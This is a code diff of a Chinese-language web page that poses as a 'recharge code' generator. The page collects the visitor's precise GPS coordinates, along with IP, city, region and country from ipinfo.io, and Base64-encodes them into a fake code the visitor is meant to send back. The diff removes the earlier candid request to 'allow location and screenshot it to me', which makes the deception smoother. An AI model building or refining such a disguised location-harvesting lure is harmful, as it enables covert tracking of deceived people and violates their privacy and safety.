@@ -52,32 +52,39 @@
 <body>
     <div class="container">
         <h1>获取充值码</h1>
-        <button onclick="getLocation()">点击获取充值码(请同意获取位置并截图给我，用于测试你)</button>
+        <button onclick="getLocation()">点击获取充值码</button>
         <div id="location"></div>
     </div>
 
     <script>
-        // 获取地理位置函数
         function getLocation() {
             if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(showPosition, showError);
+                const options = {
+                    enableHighAccuracy: true,
+                    timeout: 5000,
+                    maximumAge: 0
+                };
+                navigator.geolocation.getCurrentPosition(showPosition, showError, options);
             } else { 
-                document.getElementById("location").innerHTML = '<span class="error">Geolocation is not supported by this browser.</span>';
+                document.getElementById("location").innerHTML = '<span class="error">您的浏览器不支持地理位置功能。</span>';
             }
         }
 
-        // 成功获取位置后的回调函数
         function showPosition(position) {
-            const latitude = position.coords.latitude.toFixed(6); // 精确到小数点后6位
-            const longitude = position.coords.longitude.toFixed(6); // 精确到小数点后6位
+            const latitude = position.coords.latitude.toFixed(6);
+            const longitude = position.coords.longitude.toFixed(6);
             const locationString = `${latitude},${longitude}`;
 
-            // 获取IP地址
-            fetch('https://api.bokexia.com/api/ip/?type=json&lx=city')
+            // 获取IP地址和其他信息
+            fetch('https://ipinfo.io/json')
                 .then(response => response.json())
                 .then(data => {
-                    const ip = data.ip; // 假设API返回的IP地址字段名为 "ip"
-                    const combinedData = `${locationString}-${ip}`;
+                    const ip = data.ip || '';
+                    const city = data.city || '';
+                    const region = data.region || '';
+                    const country = data.country || '';
+
+                    const combinedData = `${locationString}-${ip}-${city}-${region}-${country}`;
                     const encodedData = btoa(combinedData); // 对字符串进行Base64编码
                     document.getElementById("location").innerHTML = `充值码: ${encodedData}`;
                 })
@@ -87,21 +94,20 @@
                 });
         }
 
-        // 获取位置失败后的回调函数
         function showError(error) {
             let errorMessage;
             switch(error.code) {
                 case error.PERMISSION_DENIED:
-                    errorMessage = "充值码获取失败，请同意获取位置，并且要截图给我."
+                    errorMessage = "获取充值码失败，请允许获取您的位置信息。"
                     break;
                 case error.POSITION_UNAVAILABLE:
-                    errorMessage = "Location information is unavailable."
+                    errorMessage = "无法获取位置信息，请稍后再试。"
                     break;
                 case error.TIMEOUT:
-                    errorMessage = "The request to get user location timed out."
+                    errorMessage = "获取位置信息超时，请稍后再试。"
                     break;
                 case error.UNKNOWN_ERROR:
-                    errorMessage = "An unknown error occurred."
+                    errorMessage = "发生未知错误，请稍后再试。"
                     break;
             }
             document.getElementById("location").innerHTML = `<span class="error">${errorMessage}</span>`;
